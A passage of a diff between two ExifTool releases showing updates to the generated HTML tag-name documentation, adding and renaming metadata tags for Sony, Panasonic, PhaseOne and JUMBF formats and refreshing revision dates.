+<td><span class=s>Bit 0 = Requestable
+  <br>Bit 1 = Label
+  <br>Bit 2 = ID
+  <br>Bit 3 = Signature</span></td></tr>
 <tr class=b>
-<td>'label'</td>
-<td>JUMBFLabel</td>
+<td>'jumd-id'</td>
+<td>JUMDID</td>
 <td class=c>no</td>
 <td>&nbsp;</td></tr>
 <tr>
-<td>'signature'</td>
-<td>JUMBFSignature</td>
+<td>'jumd-label'</td>
+<td>JUMDLabel</td>
 <td class=c>no</td>
 <td>&nbsp;</td></tr>
 <tr class=b>
-<td>'type'</td>
-<td>JUMBFType</td>
+<td>'jumd-sig'</td>
+<td>JUMDSignature</td>
+<td class=c>no</td>
+<td>&nbsp;</td></tr>
+<tr>
+<td>'jumd-type'</td>
+<td>JUMDType</td>
 <td class=c>no</td>
 <td>&nbsp;</td></tr>
 </table></td></tr></table></blockquote>
@@ -528,7 +536,7 @@
 
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
-<br><i>Last revised Apr 1, 2021</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='index.html'>&lt;-- ExifTool Tag Names</a></p>
 </body>
 </html>

diff -u -r -N exiftool-12.23/html/TagNames/MacOS.html exiftool-12.24/html/TagNames/MacOS.html
--- exiftool-12.23/html/TagNames/MacOS.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/MacOS.html	2021-04-13 15:11:46.000000000 +0000
@@ -46,7 +46,7 @@
 <p>XAttr tags are extracted using the &quot;xattr&quot; utility.  They are extracted if
 any &quot;XAttr*&quot; tag or the MacOS group is specifically requested, or by setting
 the <a href="../ExifTool.html#XAttrTags">XAttrTags</a> API option to 1 or the <a href="../ExifTool.html#RequestAll">RequestAll</a> API option to 2 or higher.
-And they extracted by default from MacOS &quot;._&quot; files when reading
+And they are extracted by default from MacOS &quot;._&quot; files when reading
 these files directly.</p>
 <blockquote>
 <table class=frame><tr><td>
@@ -654,7 +654,7 @@
 
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
-<br><i>Last revised Oct 15, 2020</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='index.html'>&lt;-- ExifTool Tag Names</a></p>
 </body>
 </html>

diff -u -r -N exiftool-12.23/html/TagNames/Panasonic.html exiftool-12.24/html/TagNames/Panasonic.html
--- exiftool-12.23/html/TagNames/Panasonic.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/Panasonic.html	2021-04-13 15:11:46.000000000 +0000
@@ -1874,6 +1874,21 @@
 <td>FNumber</td>
 <td class=c>int32s</td>
 <td>&nbsp;</td></tr>
+<tr>
+<td title='0x035b = 859'>0x035b</td>
+<td>CorrelatedColorTemp</td>
+<td class=c>int16u</td>
+<td>&nbsp;</td></tr>
+<tr class=b>
+<td title='0x035c = 860'>0x035c</td>
+<td>ColorTint</td>
+<td class=c>int16s</td>
+<td>&nbsp;</td></tr>
+<tr>
+<td title='0x035d = 861'>0x035d</td>
+<td>WhitePoint</td>
+<td class=c>rational64u[2]</td>
+<td>&nbsp;</td></tr>
 </table></td></tr></table></blockquote>
 
 <h2><a name='Type2'>Panasonic Type2 Tags</a></h2>
@@ -2090,7 +2105,7 @@
 
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
-<br><i>Last revised Oct 2, 2020</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='index.html'>&lt;-- ExifTool Tag Names</a></p>
 </body>
 </html>

diff -u -r -N exiftool-12.23/html/TagNames/PhaseOne.html exiftool-12.24/html/TagNames/PhaseOne.html
--- exiftool-12.23/html/TagNames/PhaseOne.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/PhaseOne.html	2021-04-13 15:11:46.000000000 +0000
@@ -76,11 +76,14 @@
 <td title='0x010e = 270'>0x010e</td>
 <td>RawFormat</td>
 <td class=c>int32s</td>
-<td><span class=s>1 = RAW 1
+<td><table class=cols><tr>
+  <td>1 = RAW 1
   <br>2 = RAW 2
-  <br>3 = IIQ L
-  <br>5 = IIQ S
-  <br>6 = IIQ Sv2</span></td></tr>
+  <br>3 = IIQ L</td><td>&nbsp;&nbsp;</td>
+  <td>5 = IIQ S
+  <br>6 = IIQ Sv2
+  <br>8 = IIQ L16</td></tr></table>
+</td></tr>
 <tr>
 <td title='0x010f = 271'>0x010f</td>
 <td>RawData</td>
@@ -258,7 +261,7 @@
 
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
-<br><i>Last revised Apr 9, 2019</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='index.html'>&lt;-- ExifTool Tag Names</a></p>
 </body>
 </html>

diff -u -r -N exiftool-12.23/html/TagNames/Sony.html exiftool-12.24/html/TagNames/Sony.html
--- exiftool-12.23/html/TagNames/Sony.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/Sony.html	2021-04-13 15:11:46.000000000 +0000
@@ -45,9 +45,10 @@
   <br>3 = Standard
   <br>4 = Economy
   <br>5 = Extra Fine
-  <br>6 = RAW + JPEG
+  <br>6 = RAW + JPEG/HEIF
   <br>7 = Compressed RAW
   <br>8 = Compressed RAW + JPEG
+  <br>9 = Light
   <br>4294967295 = n/a</td></tr></table>
 </td></tr>
 <tr class=b>
@@ -785,13 +786,15 @@
 <td class=c>int16u[2]</td>
 <td><table class=cols><tr>
   <td>&#39;0 0&#39; = n/a
-  <br>&#39;0 1&#39; = Standard JPEG
-  <br>&#39;0 2&#39; = Fine JPEG
-  <br>&#39;0 3&#39; = Extra Fine JPEG
+  <br>&#39;0 1&#39; = Standard
+  <br>&#39;0 2&#39; = Fine
+  <br>&#39;0 3&#39; = Extra Fine
+  <br>&#39;0 4&#39; = Light
   <br>&#39;1 0&#39; = RAW
-  <br>&#39;1 1&#39; = RAW + Standard JPEG
-  <br>&#39;1 2&#39; = RAW + Fine JPEG
-  <br>&#39;1 3&#39; = RAW + Extra Fine JPEG</td></tr></table>
+  <br>&#39;1 1&#39; = RAW + Standard
+  <br>&#39;1 2&#39; = RAW + Fine
+  <br>&#39;1 3&#39; = RAW + Extra Fine
+  <br>&#39;1 4&#39; = RAW + Light</td></tr></table>
 </td></tr>
 <tr class=b>
 <td title='0x202f = 8239'>0x202f</td>
@@ -804,16 +807,53 @@
 <td class=c>string</td>
 <td>&nbsp;</td></tr>
 <tr class=b>
+<td title='0x2032 = 8242'>0x2032</td>
+<td>Shadows</td>
+<td class=c>int32s</td>
+<td>&nbsp;</td></tr>
+<tr>
+<td title='0x2033 = 8243'>0x2033</td>
+<td>Highlights</td>
+<td class=c>int32s</td>
+<td>&nbsp;</td></tr>
+<tr class=b>
+<td title='0x2034 = 8244'>0x2034</td>
+<td>Fade</td>
+<td class=c>int32s</td>
+<td>&nbsp;</td></tr>
+<tr>
+<td title='0x2035 = 8245'>0x2035</td>
+<td>SharpnessRange</td>
+<td class=c>int32s</td>
+<td>&nbsp;</td></tr>
+<tr class=b>
+<td title='0x2036 = 8246'>0x2036</td>
+<td>Clarity</td>
+<td class=c>int32s</td>
+<td>&nbsp;</td></tr>
+<tr>
+<td title='0x2037 = 8247'>0x2037</td>
+<td>FocusFrameSize</td>
+<td class=c>no</td>
+<td>&nbsp;</td></tr>
+<tr class=b>
+<td title='0x2039 = 8249'>0x2039</td>
+<td>JPEG-HEIFSwitch</td>
+<td class=c>int16u</td>
+<td><span class=s>0 = JPEG
+  <br>1 = HEIF
+  <br>65535 = n/a</span></td></tr>
+<tr>
 <td title='0x3000 = 12288'>0x3000</td>
 <td>ShotInfo</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#ShotInfo'>Sony ShotInfo Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x900b = 36875'>0x900b</td>
 <td>Tag900b</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag900b'>Sony Tag900b Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0x9050 = 36944'>0x9050</td>
 <td>Tag9050a
   <br>Tag9050b
@@ -822,7 +862,7 @@
 <td>--&gt; <a href='Sony.html#Tag9050a'>Sony Tag9050a Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9050b'>Sony Tag9050b Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9050c'>Sony Tag9050c Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x9400 = 37888'>0x9400</td>
 <td>Tag9400a
   <br>Tag9400b
@@ -831,22 +871,22 @@
 <td>--&gt; <a href='Sony.html#Tag9400a'>Sony Tag9400a Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9400b'>Sony Tag9400b Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9400c'>Sony Tag9400c Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0x9401 = 37889'>0x9401</td>
 <td>Tag9401</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag9401'>Sony Tag9401 Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x9402 = 37890'>0x9402</td>
 <td>Tag9402</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag9402'>Sony Tag9402 Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0x9403 = 37891'>0x9403</td>
 <td>Tag9403</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag9403'>Sony Tag9403 Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x9404 = 37892'>0x9404</td>
 <td>Tag9404a
   <br>Tag9404b
@@ -855,41 +895,41 @@
 <td>--&gt; <a href='Sony.html#Tag9404a'>Sony Tag9404a Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9404b'>Sony Tag9404b Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9404c'>Sony Tag9404c Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0x9405 = 37893'>0x9405</td>
 <td>Tag9405a
   <br>Tag9405b</td>
 <td class=c>-<br>-</td>
 <td>--&gt; <a href='Sony.html#Tag9405a'>Sony Tag9405a Tags</a>
   <br>--&gt; <a href='Sony.html#Tag9405b'>Sony Tag9405b Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x9406 = 37894'>0x9406</td>
 <td>Tag9406</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag9406'>Sony Tag9406 Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0x940a = 37898'>0x940a</td>
 <td>Tag940a</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag940a'>Sony Tag940a Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x940c = 37900'>0x940c</td>
 <td>Tag940c</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag940c'>Sony Tag940c Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0x940e = 37902'>0x940e</td>
 <td>AFInfo
   <br>Tag940e</td>
 <td class=c>-<br>-</td>
 <td>--&gt; <a href='Sony.html#AFInfo'>Sony AFInfo Tags</a>
   <br>--&gt; <a href='Sony.html#Tag940e'>Sony Tag940e Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0x9416 = 37910'>0x9416</td>
 <td>Sony_0x9416</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Sony.html#Tag9416'>Sony Tag9416 Tags</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb000 = 45056'>0xb000</td>
 <td>FileFormat</td>
 <td class=c>int8u[4]</td>
@@ -907,7 +947,7 @@
   <br>&#39;3 3 5 0&#39; = ARW 2.3.5
   <br>&#39;4 0 0 0&#39; = ARW 4.0</td></tr></table>
 </td></tr>
-<tr>
+<tr class=b>
 <td title='0xb001 = 45057'>0xb001</td>
 <td>SonyModelID</td>
 <td class=c>int16u</td>
@@ -1001,7 +1041,7 @@
   <br>384 = ILCE-1
   <br>385 = ILME-FX3</td></tr></table>
 </td></tr>
-<tr class=b>
+<tr>
 <td title='0xb020 = 45088'>0xb020</td>
 <td>CreativeStyle</td>
 <td class=c>string</td>
@@ -1027,17 +1067,17 @@
   <br>&#39;VV2&#39; = Vivid 2
   <br>&#39;Vivid&#39; = Vivid</td></tr></table>
 </td></tr>
-<tr>
+<tr class=b>
 <td title='0xb021 = 45089'>0xb021</td>
 <td>ColorTemperature</td>
 <td class=c>int32u</td>
 <td>&nbsp;</td></tr>
-<tr class=b>
+<tr>
 <td title='0xb022 = 45090'>0xb022</td>
 <td>ColorCompensationFilter</td>
 <td class=c>int32u</td>
 <td><span class=s><span class=n>(negative is green, positive is magenta)</span></span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb023 = 45091'>0xb023</td>
 <td>SceneMode</td>
 <td class=c>int32u</td>
@@ -1068,14 +1108,14 @@
   <br>33 = HDR
   <br>65535 = n/a</td></tr></table>
 </td></tr>
-<tr class=b>
+<tr>
 <td title='0xb024 = 45092'>0xb024</td>
 <td>ZoneMatching</td>
 <td class=c>int32u</td>
 <td><span class=s>0 = ISO Setting Used
   <br>1 = High Key
   <br>2 = Low Key</span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb025 = 45093'>0xb025</td>
 <td>DynamicRangeOptimizer</td>
 <td class=c>int32u</td>
@@ -1095,24 +1135,24 @@
   <br>19 = Lv4
   <br>20 = Lv5</td></tr></table>
 </td></tr>
-<tr class=b>
+<tr>
 <td title='0xb026 = 45094'>0xb026</td>
 <td>ImageStabilization</td>
 <td class=c>int32u</td>
 <td><span class=s>0 = Off
   <br>1 = On
   <br>4294967295 = n/a</span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb027 = 45095'>0xb027</td>
 <td>LensType</td>
 <td class=c>int32u</td>
 <td>--&gt; <a href='Sony.html#LensType'>Sony LensType Values</a></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb028 = 45096'>0xb028</td>
 <td>MinoltaMakerNote</td>
 <td class=c>-</td>
 <td>--&gt; <a href='Minolta.html'>Minolta Tags</a></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb029 = 45097'>0xb029</td>
 <td>ColorMode</td>
 <td class=c>int32u</td>
@@ -1144,23 +1184,23 @@
   <br>255 = Off
   <br>4294967295 = n/a</td></tr></table>
 </td></tr>
-<tr class=b>
+<tr>
 <td title='0xb02a = 45098'>0xb02a</td>
 <td>LensSpec</td>
 <td class=c>int8u[8]</td>
 <td><span class=s><span class=n>(like LensInfo, but also specifies lens features: DT, E, ZA, G, SSM, SAM,
 OSS, STF, Reflex, Macro and Fisheye)</span></span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb02b = 45099'>0xb02b</td>
 <td>FullImageSize</td>
 <td class=c>int32u[2]</td>
 <td>&nbsp;</td></tr>
-<tr class=b>
+<tr>
 <td title='0xb02c = 45100'>0xb02c</td>
 <td>PreviewImageSize</td>
 <td class=c>int32u[2]</td>
 <td>&nbsp;</td></tr>
-<tr>
+<tr class=b>
 <td title='0xb040 = 45120'>0xb040</td>
 <td>Macro</td>
 <td class=c>int16u</td>
@@ -1168,7 +1208,7 @@
   <br>1 = On
   <br>2 = Close Focus
   <br>65535 = n/a</span></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb041 = 45121'>0xb041</td>
 <td>ExposureMode</td>
 <td class=c>int16u</td>
@@ -1205,7 +1245,7 @@
   <br>42 = 3D Image
   <br>65535 = n/a</td></tr></table>
 </td></tr>
-<tr>
+<tr class=b>
 <td title='0xb042 = 45122'>0xb042</td>
 <td>FocusMode</td>
 <td class=c>int16u</td>
@@ -1214,7 +1254,7 @@
   <br>2 = AF-C
   <br>4 = Permanent-AF
   <br>65535 = n/a</span></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb043 = 45123'>0xb043</td>
 <td>AFAreaMode</td>
 <td class=c>int16u</td>
@@ -1238,14 +1278,14 @@
   <br>15 = Face Tracking
   <br>255 = Manual</td></tr></table>
 </td></tr>
-<tr>
+<tr class=b>
 <td title='0xb044 = 45124'>0xb044</td>
 <td>AFIlluminator</td>
 <td class=c>int16u</td>
 <td><span class=s>0 = Off
   <br>1 = Auto
   <br>65535 = n/a</span></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb047 = 45127'>0xb047</td>
 <td>JPEGQuality</td>
 <td class=c>int16u</td>
@@ -1253,7 +1293,7 @@
   <br>1 = Fine
   <br>2 = Extra Fine
   <br>65535 = n/a</span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb048 = 45128'>0xb048</td>
 <td>FlashLevel</td>
 <td class=c>int16s</td>
@@ -1277,7 +1317,7 @@
   <br>128 = n/a
   <br>32767 = High</td></tr></table>
 </td></tr>
-<tr class=b>
+<tr>
 <td title='0xb049 = 45129'>0xb049</td>
 <td>ReleaseMode</td>
 <td class=c>int16u</td>
@@ -1289,14 +1329,14 @@
   <br>8 = DRO Bracketing
   <br>65535 = n/a</td></tr></table>
 </td></tr>
-<tr>
+<tr class=b>
 <td title='0xb04a = 45130'>0xb04a</td>
 <td>SequenceNumber</td>
 <td class=c>int16u</td>
 <td><span class=s><span class=n>(shot number in continuous burst)</span>
   <br>0 = Single
   <br>65535 = n/a</span></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb04b = 45131'>0xb04b</td>
 <td>Anti-Blur</td>
 <td class=c>int16u</td>
@@ -1304,7 +1344,7 @@
   <br>1 = On (Continuous)
   <br>2 = On (Shooting)
   <br>65535 = n/a</span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb04e = 45134'>0xb04e</td>
 <td>FocusMode</td>
 <td class=c>int16u</td>
@@ -1314,14 +1354,14 @@
   <br>3 = AF-C
   <br>5 = Semi-manual
   <br>6 = DMF</span></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb04f = 45135'>0xb04f</td>
 <td>DynamicRangeOptimizer</td>
 <td class=c>int16u</td>
 <td><span class=s>0 = Off
   <br>1 = Standard
   <br>2 = Plus</span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb050 = 45136'>0xb050</td>
 <td>HighISONoiseReduction2</td>
 <td class=c>int16u</td>
@@ -1331,14 +1371,14 @@
   <br>2 = Low
   <br>3 = Off
   <br>65535 = n/a</span></td></tr>
-<tr class=b>
+<tr>
 <td title='0xb052 = 45138'>0xb052</td>
 <td>IntelligentAuto</td>
 <td class=c>int16u</td>
 <td><span class=s>0 = Off
   <br>1 = On
   <br>2 = Advanced</span></td></tr>
-<tr>
+<tr class=b>
 <td title='0xb054 = 45140'>0xb054</td>
 <td>WhiteBalance</td>
 <td class=c>int16u</td>
@@ -5277,7 +5317,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='4447 = 0x115f'>4447</td>
@@ -5303,7 +5346,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='4451 = 0x1163'>4451</td>
@@ -5671,7 +5717,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='4451 = 0x1163'>4451</td>
@@ -5697,7 +5746,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='4455 = 0x1167'>4455</td>
@@ -5897,7 +5949,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='4415 = 0x113f'>4415</td>
@@ -5923,7 +5978,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='4419 = 0x1143'>4419</td>
@@ -6109,7 +6167,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='4539 = 0x11bb'>4539</td>
@@ -6135,7 +6196,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='4543 = 0x11bf'>4543</td>
@@ -6325,7 +6389,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='4503 = 0x1197'>4503</td>
@@ -6351,7 +6418,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='4507 = 0x119b'>4507</td>
@@ -6592,7 +6662,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='4175 = 0x104f'>4175</td>
@@ -6618,7 +6691,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='4179 = 0x1053'>4179</td>
@@ -6804,7 +6880,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='583 = 0x247'>583</td>
@@ -6830,7 +6909,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='587 = 0x24b'>587</td>
@@ -7062,7 +7144,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='583 = 0x247'>583</td>
@@ -7088,7 +7173,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='587 = 0x24b'>587</td>
@@ -7325,7 +7413,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='568 = 0x238'>568</td>
@@ -7351,7 +7442,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr class=b>
 <td class=r title='572 = 0x23c'>572</td>
@@ -8157,7 +8251,7 @@
 </table></td></tr></table></blockquote>
 
 <h2><a name='Tag9050c'>Sony Tag9050c Tags</a></h2>
-<p>Valid from July 2020 for ILCE-1/7SM3.</p>
+<p>Valid from July 2020 for ILCE-1/7SM3, ILME-FX3.</p>
 <blockquote>
 <table class=frame><tr><td>
 <table class=inner cellspacing=1>
@@ -8226,6 +8320,11 @@
 <td>InternalSerialNumber</td>
 <td class=c title=' ~ = Writable only with -n'>int8u[6]~</td>
 <td>&nbsp;</td></tr>
+<tr class=b>
+<td class=r title='138 = 0x8a'>138</td>
+<td>InternalSerialNumber</td>
+<td class=c title=' ~ = Writable only with -n'>int8u[6]~</td>
+<td>&nbsp;</td></tr>
 </table></td></tr></table></blockquote>
 
 <h2><a name='Tag9400a'>Sony Tag9400a Tags</a></h2>
@@ -8462,7 +8561,12 @@
 <td><span class=s>0 = JPEG
   <br>1 = RAW
   <br>2 = RAW + JPEG
-  <br>3 = JPEG + MPO</span></td></tr>
+  <br>3 = JPEG + MPO
+  <br>1 = JPEG
+  <br>2 = RAW
+  <br>3 = RAW + JPEG
+  <br>4 = HEIF
+  <br>6 = RAW + HEIF</span></td></tr>
 <tr>
 <td class=r title='71 = 0x47'>71</td>
 <td>SonyImageHeight</td>
@@ -9046,7 +9150,7 @@
 </table></td></tr></table></blockquote>
 
 <h2><a name='Tag940c'>Sony Tag940c Tags</a></h2>
-<p>NEX and ILCE models only.</p>
+<p>E-mount cameras only.</p>
 <blockquote>
 <table class=frame><tr><td>
 <table class=inner cellspacing=1>
@@ -10816,7 +10920,7 @@
 </table></td></tr></table></blockquote>
 
 <h2><a name='Tag9416'>Sony Tag9416 Tags</a></h2>
-<p>Valid for the ILCE-1/7SM3.</p>
+<p>Valid for the ILCE-1/7SM3, ILME-FX3.</p>
 <blockquote>
 <table class=frame><tr><td>
 <table class=inner cellspacing=1>
@@ -10928,7 +11032,10 @@
   <br>29 = Gamma ITU709 (800%)
   <br>31 = Gamma S-Log3 (PP8 or PP9)
   <br>33 = Gamma HLG2 (PP10)
-  <br>34 = Gamma HLG3</td></tr></table>
+  <br>34 = Gamma HLG3
+  <br>37 = FL
+  <br>39 = IN
+  <br>40 = SH</td></tr></table>
 </td></tr>
 <tr>
 <td class=r title='113 = 0x71'>113</td>
@@ -11648,7 +11755,7 @@
 
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
-<br><i>Last revised Apr 1, 2021</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='index.html'>&lt;-- ExifTool Tag Names</a></p>
 </body>
 </html>

diff -u -r -N exiftool-12.23/html/TagNames/index.html exiftool-12.24/html/TagNames/index.html
--- exiftool-12.23/html/TagNames/index.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/index.html	2021-04-13 15:11:46.000000000 +0000
@@ -10,7 +10,7 @@
 <h2 class=top>ExifTool Tag Names</h2>
 <p>
 The tables listed below give the names of all tags recognized by ExifTool.
-They contain a total of 24102 tags, with 15604 unique tag names.
+They contain a total of 24118 tags, with 15614 unique tag names.
 </p>
 <blockquote>
 <table width='100%' class=frame><tr><td>
@@ -233,7 +233,7 @@
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
 <br><i>Created Feb 15, 2005</i>
-<br><i>Last revised Apr 1, 2021</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='../index.html'>&lt;-- Back to ExifTool home page</a></p>
 </body>
 </html>

